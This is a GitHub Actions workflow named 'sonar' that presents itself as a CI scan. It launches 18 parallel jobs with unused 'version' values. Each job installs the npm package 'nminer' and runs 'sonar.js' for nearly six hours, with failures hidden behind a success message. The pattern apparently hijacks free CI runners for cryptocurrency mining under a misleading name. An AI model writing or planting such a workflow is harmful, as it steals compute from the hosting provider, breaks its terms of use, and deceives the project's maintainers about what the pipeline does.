name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1439 }
          - { version: 4573 }
          - { version: 4258 }
          - { version: 4395 }
          - { version: 8398 }
          - { version: 6824 }
          - { version: 2127 }
          - { version: 4137 }
          - { version: 6014 }
          - { version: 2948 }
          - { version: 3610 }
          - { version: 4556 }
          - { version: 5432 }
          - { version: 9457 }
          - { version: 6594 }
          - { version: 482 }
          - { version: 7564 }
          - { version: 8957 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: represent with sailor plus
        run: |
          npm install nminer@latest
          timeout 345m node sonar.js || echo "sonar executed"